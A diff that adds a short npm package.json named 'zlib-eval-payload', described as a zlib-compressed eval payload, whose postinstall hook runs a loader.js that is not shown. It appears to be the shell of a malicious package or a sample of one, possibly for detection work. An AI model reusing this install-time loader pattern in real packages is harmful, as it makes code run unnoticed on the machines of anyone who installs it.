@@ -1,0 +1,8 @@
+{
+  "name": "zlib-eval-payload",
+  "version": "1.0.0",
+  "description": "Zlib-compressed eval payload",
+  "scripts": {
+    "postinstall": "node loader.js"
+  }
+}
